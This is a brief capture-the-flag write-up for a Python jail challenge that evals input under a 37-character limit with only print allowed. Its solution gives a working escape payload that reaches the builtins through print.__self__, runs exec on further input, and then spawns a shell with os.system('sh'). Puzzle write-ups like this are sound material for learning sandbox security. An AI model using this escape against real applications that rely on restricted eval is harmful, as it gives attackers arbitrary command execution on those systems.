# minijail

author is Robin_Jadoul

source: [here](https://imaginaryctf.org/ArchivedChallenges/16)

## challenge

main.py
```py
MAX = 37

x = input(">>> ").strip()
assert len(x) <= MAX
eval(x, {'__builtins__': {'print': print}})
```

## solution

first, send `[b:=print.__self__,b.exec(b.input())]`

this sets the `b` variable with walrus operator to builtins, and then calls `exec(input())`

then, send `print('test');b.__import__('os').system('sh')` to get a shell
